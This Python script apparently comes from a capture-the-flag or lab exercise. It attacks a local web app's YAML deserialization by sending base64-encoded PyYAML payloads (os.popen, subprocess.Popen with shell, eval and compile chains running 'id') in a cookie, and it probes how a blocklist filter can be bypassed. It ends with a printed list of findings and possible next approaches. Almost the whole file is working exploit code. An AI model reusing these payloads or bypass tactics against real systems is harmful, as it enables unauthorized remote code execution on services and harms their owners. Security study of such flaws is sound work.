import requests
import base64

TARGET = "http://127.0.0.1:32979"
session = requests.Session()

print("FORCING OS.POPEN EXECUTION")
print("=" * 60)

# os.popen returns a file-like object that executes on read/close
# We need to force read() or trigger the execution

execution_payloads = [
    # Try to call read() on the popen object
    ("popen_with_method", """!!python/object/new:os.popen
args: ["id"]
state:
  - !!python/name:os.popen.read
"""),
    
    # Try subprocess with shell
    ("subprocess_shell", """!!python/object/new:subprocess.Popen
args: ["id", "-c", "id"]
shell: true
"""),
    
    # Try to use open() trick
    ("open_pipe", """!!python/object/new:builtins.open
args: ["|id", "r"]"""),
    
    # Different constructor approach
    ("popen_ctor", """!!python/object/apply:os.popen.__new__
args:
  - "id"
  - "r"
"""),
    
    # Try to use __enter__ context manager
    ("popen_context", """!!python/object/new:os.popen
args: ["id > /tmp/test_output"]
state:
  enter: !!python/name:os.popen.__enter__
  exit: !!python/name:os.popen.__exit__
"""),
    
    # Try io module with popen
    ("io_popen", """!!python/object/new:io.FileIO
args: ["|id"]"""),
    
    # Try to chain commands
    ("command_chain", """!!python/object/apply:builtins.callable
args:
  - !!python/object/new:os.popen
    args: ["id"]
"""),
]

for name, payload in execution_payloads:
    try:
        encoded = base64.b64encode(payload.encode()).decode()
        cookies = {'user': 'f99d00962aa7465fa151128d2318d75d', 'bookmarks': encoded}
        response = session.get(f"{TARGET}/list", cookies=cookies, timeout=10)
        
        print(f"\n[{name}]")
        print(f"Status: {response.status_code}")
        print(f"Size: {len(response.text)}B")
        
        if response.status_code == 200:
            # Check for bookmarks in response
            if '<h5 class="mb-1"></h5>' in response.text:
                print("  [+] Empty bookmark created")
            elif 'id' in response.text.lower() and 'uid=' in response.text.lower():
                print("  [!] COMMAND OUTPUT DETECTED!")
                print(response.text[:500])
        
    except Exception as e:
        print(f"\n[{name}] Exception: {str(e)[:50]}")

print("\n" + "=" * 60)
print("TESTING URLCLASS IMPORT TRICKS")
print("=" * 60)

# Try to abuse the UrlObj class import path
# Maybe we can use the import system

import_payloads = [
    # Try __import__ directly
    ("import_os", """!!python/object/new:builtins.__import__
args: ["os"]"""),
    
    # Try to get __builtins__
    ("get_builtins", """!!python/object/new:builtins.globals
args: []
"""),
    
    # Try eval with string
    ("eval_import", """!!python/object/apply:eval
args:
  - "__import__('os').system('id')"
"""),
]

for name, payload in import_payloads:
    try:
        encoded = base64.b64encode(payload.encode()).decode()
        cookies = {'user': 'f99d00962aa7465fa151128d2318d75d', 'bookmarks': encoded}
        response = session.get(f"{TARGET}/list", cookies=cookies, timeout=10)
        
        print(f"\n[{name}] Status: {response.status_code} | Size: {len(response.text)}B")
        
    except Exception as e:
        print(f"\n[{name}] Exception: {str(e)[:50]}")

print("\n" + "=" * 60)
print("TESTING ATTRIBUTE ACCESS CHAINS")
print("=" * 60)

# Try to chain attribute access to get to system
chain_payloads = [
    # Get os via sys.modules
    ("sys_modules", """!!python/object/new:sys.modules.__getitem__
args: ["os"]
"""),
    
    # Alternative: use warnings.catch_warnings
    ("warnings_class", """!!python/object/new:warnings.catch_warnings
state:
  _module: !!python/module:os
"""),
    
    # Use types.FunctionType
    ("function_type", """!!python/object/new:types.FunctionType
args:
  - !!python/object/apply:compile
    args:
      - "import os; os.system('id')"
      - "<string>"
      - "exec"
"""),
]

for name, payload in chain_payloads:
    try:
        encoded = base64.b64encode(payload.encode()).decode()
        cookies = {'user': 'f99d00962aa7465fa151128d2318d75d', 'bookmarks': encoded}
        response = session.get(f"{TARGET}/list", cookies=cookies, timeout=10)
        
        print(f"\n[{name}] Status: {response.status_code} | Size: {len(response.text)}B")
        
    except Exception as e:
        print(f"\n[{name}] Exception: {str(e)[:50]}")

print("\n" + "=" * 60)
print("FINAL YAML BYPASS SUMMARY")
print("=" * 60)

# What we've learned:
print("""
Key Findings:
1. !!python/object/apply:os.system → Status 500 (blocked but processed)
2. !!python/object/new:os.popen → Status 200 (passes through, creates empty object)
3. Valid UrlObj → Status 200 (works correctly)

Analysis:
- The filter appears to check for dangerous method calls in YAML
- 'apply' tags that match blocked patterns trigger 500 errors
- 'new' tags with os.popen pass through because os.popen is not on the blocklist
- However, the os.popen object doesn't cause RCE without further interaction

The challenge is finding a way to make os.popen actually execute commands.
Potential approaches:
1. Force __init__ or __enter__ execution
2. Find another class that executes on instantiation
3. Use attribute chains to reach dangerous methods
4. Exploit UrlObj class itself if it has dangerous methods
""")

